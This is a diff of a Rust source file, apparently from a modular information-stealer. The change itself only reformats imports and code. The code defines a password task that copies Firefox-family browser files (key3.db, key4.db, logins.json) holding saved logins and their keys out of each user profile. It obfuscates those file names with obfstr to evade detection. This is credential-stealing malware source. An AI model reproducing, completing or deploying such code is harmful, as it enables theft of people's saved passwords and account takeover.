@@ -1,16 +1,16 @@
 use crate::gecko::GeckoBrowserData;
-use crate::{collect_unique_from_profiles, read_and_collect_unique_records, SqliteDatabase};
+use crate::{SqliteDatabase, collect_unique_from_profiles, read_and_collect_unique_records};
 use alloc::sync::Arc;
 use alloc::vec::Vec;
 use collector::Collector;
 use database::{Database, DatabaseExt, TableRecord};
 use derive_new::new;
-use indoc::indoc;
 use filesystem::path::Path;
 use filesystem::storage::StorageFileSystem;
-use filesystem::{copy_file, FileSystem, WriteTo};
-use tasks::Task;
+use filesystem::{FileSystem, WriteTo, copy_file};
+use indoc::indoc;
 use obfstr::obfstr as s;
+use tasks::Task;
 
 #[derive(new)]
 pub(super) struct PasswordTask<'a> {
@@ -26,18 +26,17 @@ impl<C: Collector, F: FileSystem> Task<C, F> for PasswordTask<'_> {
                 continue;
             };
 
-            [
-                s!("key3.db"),
-                s!("key4.db"),
-                s!("logins.json")
-            ].iter().for_each(|file| {
+            [s!("key3.db"), s!("key4.db"), s!("logins.json")]
+                .iter()
+                .for_each(|file| {
                     let _ = copy_file(
                         StorageFileSystem,
                         profile / file,
                         filesystem,
                         parent / name,
-                        true
-                    ).map(|_| at_least_one = true);
+                        true,
+                    )
+                    .map(|_| at_least_one = true);
                 })
         }
 
